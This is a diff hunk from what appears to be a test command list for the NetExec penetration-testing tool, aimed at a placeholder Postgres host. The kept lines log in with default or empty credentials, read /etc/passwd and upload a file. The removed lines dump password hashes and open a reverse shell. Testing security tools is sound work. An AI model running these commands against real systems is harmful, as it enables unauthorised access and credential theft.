@@ -394,7 +394,3 @@ netexec nfs TARGET_HOST -u "" -p "" --chmod 666 /NFStest/test/test.txt
 netexec postgres TARGET_HOST --default-creds
 netexec postgres TARGET_HOST -u "" -p "" --get-file /etc/passwd ../passwd
 netexec postgres TARGET_HOST -u "" -p "" --put-file /tmp/local_file.txt /tmp/file.txt
-netexec postgres TARGET_HOST -u "" -p "" -M pg_databases
-netexec postgres TARGET_HOST -u "" -p "" -M pg_passwords
-netexec postgres TARGET_HOST -u "" -p "" -M pg_users
-netexec postgres TARGET_HOST -u "" -p "" -M pg_reverse_shell
